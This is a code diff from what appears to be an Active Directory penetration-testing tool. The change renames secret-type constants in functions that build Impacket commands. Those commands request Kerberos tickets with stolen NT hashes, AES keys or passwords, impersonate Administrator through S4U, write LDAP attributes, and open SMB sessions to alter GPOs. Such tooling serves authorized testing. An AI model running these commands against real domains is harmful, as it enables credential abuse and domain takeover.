@@ -60,11 +60,11 @@ def TGTRequest(glob:dict, parent:Owned, nopass=False):
 
     comment = 'Ask a TGT for {parent.obj.name}'
 
-    if parent.secret_type == c.SECRET_AESKEY:
+    if parent.secret_type == c.T_SECRET_AESKEY:
         cmd = "getTGT.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -aesKey {parent.secret}"
-    elif parent.secret_type == c.SECRET_NTHASH:
+    elif parent.secret_type == c.T_SECRET_NTHASH:
         cmd = "getTGT.py '{fqdn}/{parent.obj.name}' -dc-ip {dc_ip} -hashes :{parent.secret}"
-    elif parent.secret_type == c.SECRET_PASSWORD:
+    elif parent.secret_type == c.T_SECRET_PASSWORD:
         cmd = "getTGT.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip}"
         if nopass:
             cmd += ' -no-pass'
@@ -82,20 +82,20 @@ def GetAESOnHost(glob:dict, parent:Owned):
     v = vars(glob, parent,
             plain=f'{Fore.RED}PLAIN_PASSWORD_OR_HEX{Style.RESET_ALL}')
 
-    if parent.secret_type == c.SECRET_AESKEY:
+    if parent.secret_type == c.T_SECRET_AESKEY:
         return
 
-    if parent.secret_type == c.SECRET_PASSWORD:
+    if parent.secret_type == c.T_SECRET_PASSWORD:
         comment = 'Get the AES key from the password for more convenience'
         cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{parent.obj.name}:{plain}'"
         print_line(comment, cmd, v)
         parent.secret = f'{parent.obj.name.upper().replace("$","")}_AESKEY'
-        parent.secret_type = c.SECRET_AESKEY
+        parent.secret_type = c.T_SECRET_AESKEY
         return
 
     if parent.krb_auth:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -self -impersonate Administrator -altservice HOST/{parent_no_dollar} -k -no-pass -dc-ip {dc_ip}"
-    elif parent.secret_type == c.SECRET_NTHASH:
+    elif parent.secret_type == c.T_SECRET_NTHASH:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -self -impersonate Administrator -altservice HOST/{parent_no_dollar} -hashes :{parent.secret} -dc-ip {dc_ip}"
 
     comment = "Retrieve the AES KEY on {parent.obj.name}"
@@ -121,7 +121,7 @@ def GetAESOnHost(glob:dict, parent:Owned):
     print_line(comment, cmd, v)
 
     parent.secret = f'{parent.obj.name.upper().replace("$","")}_AESKEY'
-    parent.secret_type = c.SECRET_AESKEY
+    parent.secret_type = c.T_SECRET_AESKEY
 
 
 def GetSTImpersonate(glob:dict, parent:Owned, requested_spn:str,
@@ -135,11 +135,11 @@ def GetSTImpersonate(glob:dict, parent:Owned, requested_spn:str,
 
     if parent.krb_auth:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
-    elif parent.secret_type == c.SECRET_NTHASH:
+    elif parent.secret_type == c.T_SECRET_NTHASH:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
-    elif parent.secret_type == c.SECRET_AESKEY:
+    elif parent.secret_type == c.T_SECRET_AESKEY:
         cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
-    elif parent.secret_type == c.SECRET_PASSWORD:
+    elif parent.secret_type == c.T_SECRET_PASSWORD:
         cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
 
     print_line(comment, cmd, v, end=False)
@@ -158,11 +158,11 @@ def Attr(glob:dict, parent:Owned, target_name:LDAPObject,
 
     if parent.krb_auth:
         cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_name}' -use-ldaps -dc-ip {dc_ip} -k -t '{target_name}' -key {key}"
-    elif parent.secret_type == c.SECRET_NTHASH:
+    elif parent.secret_type == c.T_SECRET_NTHASH:
         cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -hashes :{parent.secret} -t '{target_name}' -key {key}"
-    elif parent.secret_type == c.SECRET_AESKEY:
+    elif parent.secret_type == c.T_SECRET_AESKEY:
         cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}@{dc_ip}' -use-ldaps -k -aesKey {parent.secret} -t '{target_name}' -key {key}"
-    elif parent.secret_type == c.SECRET_PASSWORD:
+    elif parent.secret_type == c.T_SECRET_PASSWORD:
         cmd = "./tools/attr.py '{fqdn}/{parent.obj.name}:{parent.secret}@{dc_ip}' -use-ldaps -t '{target_name}' -key {key}"
 
     if write_value is not None:
@@ -206,11 +206,11 @@ def pre_update_gpo(glob:dict, parent:Owned, target:LDAPObject, gpo:LDAPObject):
 
     if parent.krb_auth:
         cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -k -no-pass"
-    elif parent.secret_type == c.SECRET_NTHASH:
+    elif parent.secret_type == c.T_SECRET_NTHASH:
         cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -hashes :{parent.secret}"
-    elif parent.secret_type == c.SECRET_AESKEY:
+    elif parent.secret_type == c.T_SECRET_AESKEY:
         cmd = "smbclient.py '{fqdn}/{parent.obj.name}'@{dc_name} -dc-ip {dc_ip} -k -aesKey {parent.secret}"
-    elif parent.secret_type == c.SECRET_PASSWORD:
+    elif parent.secret_type == c.T_SECRET_PASSWORD:
         cmd = "smbclient.py '{fqdn}/{parent.obj.name}:{parent.secret}'@{dc_name} -dc-ip {dc_ip}"
 
     print_line(comment, cmd, glob, end=False)
